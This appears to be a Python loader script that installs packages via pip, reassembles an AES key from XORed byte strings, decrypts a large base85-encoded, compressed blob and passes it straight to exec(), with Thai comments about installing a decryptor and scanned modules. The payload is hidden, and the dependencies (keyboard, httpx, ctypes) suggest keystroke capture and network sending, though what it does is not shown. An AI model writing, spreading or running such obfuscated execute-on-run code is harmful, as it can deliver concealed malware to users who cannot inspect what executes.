
import sys, base64, zlib, subprocess

def _req_check(p, m=None):
    if m is None: m = p
    try:
        __import__(m)
    except ImportError:
        print(f"[*] Installing dependency: {p}...")
        subprocess.check_call([sys.executable, "-m", "pip", "install", p, "--quiet"])

# ติดตั้งตัวถอดรหัสก่อน
_req_check("pycryptodome", "Crypto")

# ติดตั้ง Module ที่แสกนเจอจากโค้ดของคุณ
_needed = ['ujson', 'rich', 'os', 'datetime', 'subprocess', 'keyboard', 'httpx', 'asyncio', 'ctypes']
for mod in _needed:
    _req_check(mod)

from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad

def _xor(p):
    from functools import reduce
    return reduce(lambda a,b: bytes(x^y for x,y in zip(a,b)), p)

_K = _xor([b'\xc6\xc5i\xde\xf3\x1a(\xd3\x1e\xafo\x17\xeb\x82\xa5\xd9\xb5\xe5(\x9f;\x85\xe2}S\xbf\x10\xb5\x85e\x89\xc1', b'z\xe2e\x16\x9b\x05\xc1\xd6\x19\xd9\xdb0\xb5\xce\xbdf\xfa\xd2*\xb5\xa7\xb5,\x9bP<)\xc0\x8b\xcaWM', b'd\x0b\xc6\x02\x10C\x08\xa7\x1c]SVu\xbbE\x95\xd1\xdd\xc8K\xf4!^\xafD\xa83\x94y\xdc\xf9\xfc'])
_I = _xor([b'Y\xc3\xa6\td/\xd2;\x8f\xb5Z\xe3\xd5iU\xc5', b'\xc0\x91x\xb1\xa1G\xea+\xc7\xac\\s42/\xd2'])

def _decrypt_str(d):
    iv, p = d[:16], d[16:]
    return unpad(AES.new(_K, AES.MODE_CBC, iv).decrypt(p), 16).decode("utf-8", "ignore")

def _decrypt_bytes(d):
    iv, p = d[:16], d[16:]
    return unpad(AES.new(_K, AES.MODE_CBC, iv).decrypt(p), 16)

_enc = base64.b85decode('B<X?>DS*so{*R6dD-x59_oO{I33AUOpdvj!chDTaDitYH=lF~kNBk2Z5k$eBjn6{X*HzfXML1QI*O#+J>>W1WxCD>{XqeNh*EWqup<Pe#=UR|>j9aJ<`i2ZBtzzUz8-04JH0il!>O-0>f|&SlU}=B-hfeZiW1$AT6$+wPJQ-dVuDczd4K9^Va>R>gy$EP8rScDY?TVGpki)>$o)$vlw!i#t&QHjFoY7WZ)@(3zF<DdlXf(Py2vJtTvAp^x(9$8W88a*rpq&Y#Vq1oiA@_wP&{Bf+y_TEP9U+)x@M@!(4}hq7;|lM;f2!p!`{z6I{c>%IJapE3XwvQDzYGQv3KZspg7OUB!~Vi4W#L=WT26wf5^C4UTz2p9oe!0#N+Y`(fXWx61FjSD5rI))2^OZS@@3zG`LbvL7Bn_;GSZ=J{pqQUB@+g9M=#e-xCF%8T_oAw7b<^c>SWAVqyKEP!Q0E{P681U9gz>XJ5)d;<#}>feLV~imDc39Oh1Gab*1?|spPwB6BUHw;L@%D)9y^FKNM?ve_b!j*rCUyGgMr7x>Kf9%8ceTE@Bh+R8FcIT0Nd}=c?`1<B}$r@ttwK_~6#Y(|$UwWT&0IX=0BMsAhnS1QG;R3TkIuVScs{R_rM=r-vzC**&V%e(Te(fSOVMDgsLGDXNQbGEDDmFx2fy3s}0<0O5`LFwgjdAbos7j4YOZnnn_tXvvRrXnhh`72ZT4Y;6q{D9rs)X0@!4E5{J5DyfD}>(yi57V(6>FX0e=zwmOGek&dc&ATu1yA2r=v}tu<Mjs>$hx0;8Bq<UiUnKHsoQ2it!I8bKmf2b#^F;5Q&T%Ovt=<81^BOUHjdLZB?N7iB&B$VC3&tJ0fhJZbf$i&@X0M}l=bV@wk*2EDLKigI=%+T+X`M=<ez$=&edQM;PdG?4>BzeMh~c!0v|8uCugXpaVFVggYo8PBu{CF>0Rqu&@7A0fn0Ci;>a@q;RrAjO^ceY|R2rt6aFJbWnnWcF1A?jz#SD%D$ZDvh!sFviyn)gtPkIEm6!$cPZb%C@B&)~OuYy5KjnjfT9hR&WylfgC`8x$ifH^#1_TGvbCIL_-?63{$gGy@RsQwCd0nS3^uLIFYP7`!3?6(To9EqqdG;b&+K{j`I;3;b{bXWs7Z!QROd-oQfD}Cn$%@P`}<oswIm1ea}9^~V{hF{rZa!ZK7*pXHdGIU3+C?gFly>ym=j1M#hkEgcP$Uygc=r-Cd$;sEB0i)3dVj8ttDDVA;JIFheAsZ&Ts7r^;ix6OVkA5YRk+Slt2TM-K3(x0wo9|b#aiN6AWRt$+N?KtzkXSzt$eLH|5_fktOMHpH^ut48B6zJB8q&mSiX507Csk*+PUh%e11vdW9H7xMV@-TXoS8o~aQ0l&ht`7#8Yg!TA#oZquLF19E0}M{e~=ft4^sNdNJ`mv9QhgE%`7pF+wk>Z?5?6V`<;_FvTEz&)3b1IYgC&H4U`Dn#WK@8)``tr5frsTZ_HOGg;*9^8uD*-W(j-XINKyy(U1lxLD$)sYFfnUciZcq<_x+kB)qdgEIS~_5!(>62SE-^Cj_Sy0H|!27F2pFrUuNvYP}#(rAe}|PKMLfk@EY7qBcQQU5X-30&^V|t{SJ~nQ-s9L=CxOf!wFZ7gq=-{4cE(V<ok?3AZIey45!V;-|s<<P$#l_|`)Q)o!wP2>SLvss`V-0aj6fPULG!NJ*633qN0Td;E2pdI1_<AkY(X4^lt`$?+|{)adq;AMGTan-@qpFBYVsK~$qM(Gxd;exnZYQ&Ht&TV>TCvfRHFbRhK!oC2p(er)6^Z?Q-$X~*sJnG4ADp-^S?Jf+Zf*7}0FC7&wUu|W%+*KygmYUWMY-qjmM__Dta1B!nR4Uf8<n#?ub-4!$mBT$7@>SW4%W>JaRNMim&Bf*6)M_23uoQvQ`7IxWU_pNcl>r8eo`1~vWO-SHHO$Nv{;mcz@^vt>(!wBgj(=y=zkfy{YE5QpFDrqJlzGAb(T;G}ebexgB-xS&|D0x~tq|Ty-E3rH)XjGFf8iDvVK+6nq{QO{D0pb|JBwkWAR~ZzgOd}J>A(9mGmtRd94Ufg&r}H5oVJMZ*mwHpN#*js}b@v)6(dc?K-OHV{7&6=;*lIce?RlG7+36jP0MJJtjk+}g1ZE`V;0huhdlDktX%?kO<7g=ttiIY{$<e~uM0NVK*AQb&_04_9k`Cwj&dri)8m%d=na5n!-Mg?lqxl3)$CiZpV)>B_bTZ^vNBsRX_Rs>CGVi=r{^jj6DH8hm4mx5anpzi|{6ffZZl08+W`h;i`sZ|#I*8RKFC+si^ccq!1Dk%>^`AKs);0~Ocyf>eC&kd6`ma<UjVtmW1@eJ=^M+0XQ7W`hEVo@W;f}g(!sS>xs80Sz5;v(!9wl~V*}I9(hrUKIDT_wRJfisbpmbQ-QBXlOz)}JDN`v6q>EUv$FzF-cjkiaV#kRW{vhTG6(a}CS!2pjDf?6k!{0{@E<q2AUU<^544Af?IXOvgGXmoa!=gTG0mcM&8d}D-5KtKX)So~(244um%BQB?~+^J-NSC&~!vtEwI90py|*?v3#fqs{&p$a<`K#LAvxGpm4;CT553fV?29_xOLWXnnLsINZ=Ila#KcWhkp1)zL5r3Au9twiA4nsDNvsMJ_tt7>ODRgg-7BVXQM>qa<9d=$2rmpD@$AhV37tx){&sIvDdo&cbtn%KG^&!w%eGhib^0=chW8JZ@t0ff}jLa%fH?q5TmWx~frq@R~q?2_%liC<`hjt=#_6A<@{^lRuHAyu1#W6VZ=ho-NegUJYAV1yp36^T_G16O+v>6DmKHoogH3^!DTC)JW{86kmr;k>!(A4sZqHO%02*?^`P6TNF61_WNa(50=y4*BFc(xsTm1*bcGzmstlqI!)5VbqMOd0j$(?;QmkX>SmmNmFddcmEpfHLF~pod=QSB!R>qA6V)G_!mJghua|Y({NHy+2?ljN444zgBnfu55CJb3j&yShp6fnJ^0J5z$V^ww{?zv7$a=G-oC@t_@dLhJuhe<`#r;kTpblPxDgl{m-{iUEx^AyPzapn^=AfUSGJ&w0L@j1f|!PlhGIcORcX?c7M4b1{Kp1SA9Q4BCB7x;{U=z00flN~q^kLGoh9>U_of6h{uKjfbo25GLReOsj=S2JVa1l(B{qcQ)?N+vcUj8Vh6FOI>P?gP^`EVf3hwkueubwO?hK>Dsz;4RMGu{MVK1Qu6+{f+K6Zt%-rC<GaOJd{pzr+#yQ2W2n0n^4rn0X4YR47$2-Q3*1=I->CkcD3w&-*<k9+VCA-gDxx}y7lWFP?H%1dTJ+!96u`8@o`?b%RP>1DsQZ?(L$7yjn#weLVmhjW!*h!mziXZ}Z>?6UId-U1aFbt%f_rcF$q4Tb8f9}t35aU$)bXcY~*CuL@d#vqDVLnTT4hxk~w*F;^=#p-ku4NNSnyH_=MN0%g_PdE!AamcheztJq1b$S+KVWe^QawcQXWcIXHci8QSz%#0Ds>U1~2l)u~FzZmw$t4^%HTkf&dNj(8Ypx3WazPWZTKI7genjFwnb0<ZX@TgxsC@*|EN0kkFg{@2l6>g`pPN^4>-p^1z8S9)NK)q0d=y)fUBJMx@DKcz3`-(UDEgWiOh$mkp;1D4hU<gfrFZ9dQq<g8bVA9p{w<j;B1zguKaelrU;6~Cu8)l+byq^TO6cfH3?M{jY3V`jnB)z&Go-f7e%eOGlZFK}cINO-HHTZxeF%iy{Zadft(H--WH%C?v***7-QJlL=5hI?=G|Ugx-uMUJ;l!L5&<=ept%7A!@9@$yC0-yN{*YKqh+mrMq=y#L<G8}mBa=bf_~72io;q%%Poe%dp~Js?bPp5lL4sO?E91sX?R6aGAVbcf{o)}WCJZTI!QgjxaaKQez<X7tBh944SFjG975d%##A(corPW!3)^K5HOAa-E}dgNmGb9E%sr+W*FbOLExma#mv_dvVI%E!^j6UVq@l*G?+~dx2VIVDE9?cbqiRXd<|?@!dE1z7EXfO{-tYra%!o)*QDyjNGG@&3Mg<>OQlA6N9;lg@=<#!5u#g&qq2sZV;fA2LWM=c8eGBO0dkbYjvFO<sPaA=ti6UruzWtY8#3rCvOSyY?aV-vn^BXe$16-c0fdiT4jIL9_{ZuV1j*pF%J3=)^7XT)tpUk~r2+F0mzVnqd(vC4E`1ot2sbYcQq=|d@5HxG}U3K#=K+Rw#XO|v@5jRK}UN7pLr!H;pELMJdNBh?EEW-pQNxKJQr5}_7P!s6&z2l?6#QMp_{t9EvY#o{g3xKA!k*{641iHe=vAmAX#h{gq!<vlmDv7k!O4N4?IcG}M_$5^Zt^-{$f$r(Rg5n(Zgo?Q7!))6ndKNH!^2wlBNhd$YiuJl*j7zfg;-Qj(Q3%Gr#Xm?j%TAElFErt4KDI%bT8f9z*i)R1VszDE^KHg%D9V|9dJq^8mWR<LX@x$1SHj17=zk0Yjc_E-Rk^Q%O&eJ7@7}J}!4}!&9e$81OmRdykB>L`rr@dJ%4dl)8s}9*{-=YJJO6f!tY>dpR477bscNDa6Qy9bq9k0r(!$gm5eX%~@yY?qv@+8KHgv`_+D8kyHc?N#wld@`9ecpsES95<?zHFk<VI*n7RuDv38tm9g~HBpFdoO!2<(IhS`QBs<rtAXh5EAwyYm~3w~cEfIz?z+J-dnEH;{+*O<bT1r{UX%9$yd+_B+Qo!JIR-7oGFcYrbKp+-W?mY3nN>FWK6r%QWs`uTS4AiU6ug;5+-Ga;hWxWnQEnYGf)07BNZx&>n#ZUhRSp`U(*Fv@0c$pYVM(PAs~8+v8+Lf~^@YIvI-@|A(6d+l(0Dm?>afkCdpWN~Jeb;p?Yg#IxFfkY~6<yAeyz&z(%fPW;I|S9&D(LxIh60MfjGN`yzgGyiNoe<F^^{JyMovj{_NWO$VmtOh=Uc2Pf=L(nLQazg0S02WNEzuD>^Y|e=`e6a$q6t(f8M~5!vK);TpBedk#?*~h0fVtK7`paY{kA;G&7l%bk7VzA+42E*uj?XXa|7TGco!r#&wRZE5e)!^bj6_m8v1C!Vt}fU;v05kb5~8c#TEI-?d7Ia#E&NrPE6pP&M}E%HT3k;t&COWAa>Tw)`2*YM>Udhj-XSfPX_PY^Ri*)7?Yfbfp-ff*ZECtITSVq)d?YI4{(5AYuz;bq!ant&q$A3LD>+yZXb_QM#~Mv?gXAaBValKF(+s3&smCn;KBYHl^aQfpt%VdfUc6Zp!GP3KmQ-Er_j_+c9Zmn$nzAOOpE30jp9CeK&IDR3Ww1C#KM<$4%u;KTTU))11iljFB<+0t>_rW}9}dv^N1&r))_NFy?!OF!Kb4=-ZnZaB`h<6KKV<f%Xc>07dpj(jZ5;3)s;*X#1EU=b#Sa{C66&Xf%%j&&6F&*Z)XJpO$V$>4Z6v!51h|Omsh`cC)d%++Ict+m!!X?2ZA;cWk0}LCNJl5HJ<g{8FH!H5-jtN$rXE)Qh!YQ1W~;rhMv+evU>%BR*W0e{oVTp4!Ir5*=^25O9Eyf$=XFbriz3?jYkXJ{nyp-#@qR3-#%TkEq>|^u@z=D`z0lDeR%Dk8hQH=gfVsyIL9WeeAL2bBHg-^e>*nh5?gobjy+4AN4!?g9hrr+gco@IQL}VwvXVR}Rg*pV|!9&UhuYu&K^GpoSA50RdW0rjv<;sMEK6;7ouzlXI$2PILotg`t=KJjS(yBTvVTUbDmKD1e^vZH2#Yb+cC9vlv2<CM^+PaUH4GrB`iC{7Q&moTYcp$5%weR?-+N^b<(L*nEo?%^>1)WB~ZedW-+YhWbFgo3ybd|;rT{#MP3-gRxU~)ta^|~Kq6QYm=)Oo;U)NJ7_EF-An>^u(SD=R(ri1iD>{oyrVF~^0F^NnEgeRHLARt&Va;E!&QUJE@wL8k}*OMA=^SEPeyG2o|zAUtxh6GeB??Q($EIV+ek_UuPNYaJ~VS7gpJ?OdcV2C)pN%6MA0{ps8IEh@x)Eg04i0pTSq#dSxhB`avi!3Ke_6suncBQ`D}UyWYtN7TCQ9h?gb6UknjW*qc#8ahatwFRHUJsbU?*^q{!%&cYx#Myylc;w@alIqZPch*GiI*buaT$?Kc8fmYg{sDV!hAz;?D$rfl|3+_NQ4zE$f;I_0(!X6;RnhRN66E-%o3TT1T-Ik;H4jGfxiFbpxlHe0Vw?-LS5Ki~hKaoM5x4NM0{fyiP7(+guWkWE')
_raw = unpad(AES.new(_K, AES.MODE_CBC, _I).decrypt(_enc), 16)

# EXECUTE UNIVERSAL CODE
exec(zlib.decompress(_raw).decode('utf-8'), {
    "__name__": "__main__",
    "__builtins__": __builtins__,
    "_decrypt_str": _decrypt_str,
    "_decrypt_bytes": _decrypt_bytes,
})
